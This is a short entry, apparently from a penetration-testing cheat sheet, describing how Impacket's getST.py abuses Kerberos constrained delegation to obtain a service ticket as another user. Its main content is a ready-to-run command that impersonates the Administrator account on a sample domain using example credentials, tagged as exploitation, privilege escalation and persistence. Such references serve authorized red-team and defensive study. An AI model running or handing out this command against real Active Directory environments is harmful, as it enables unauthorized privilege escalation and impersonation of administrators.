    raw:
      file: Impacket-getST-Creds.md
      document: "---\ndescription: |\n  Impacket's getST.py will request a Service Ticket and save it\
        \ as ccache. If the account has constrained delegation privileges, you can use the `-impersonate`\
        \ flag to request a ticket on behalf of another user. The following command will impersonate the\
        \ Administrator account and request a Service Ticket on its behalf for the `www` service on host\
        \ `server01.test.local`.\n\n  Command Reference:\n\n  \tTarget IP: 10.10.10.1\n\n  \tDomain: test.local\n\
        \n  \tService: www\n\n  \tHost Name: server01.test.local\n\n  \tUsername: john\n\n  \tPassword:\
        \ password123\n\n  \tImpersonated User: Administrator\n\ncommand: |\n  python3 getST.py -spn www/server01.test.local\
        \ -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123\nitems:\n  - Username\n\
        \  - Password\nservices:\n  - Kerberos\nOS:\n  - Linux\n  - Windows\nattack_types:\n  - Exploitation\n\
        \  - PrivEsc\n  - Persistence\nreferences:\n  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py\n\
        \  - http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html\n---\n"
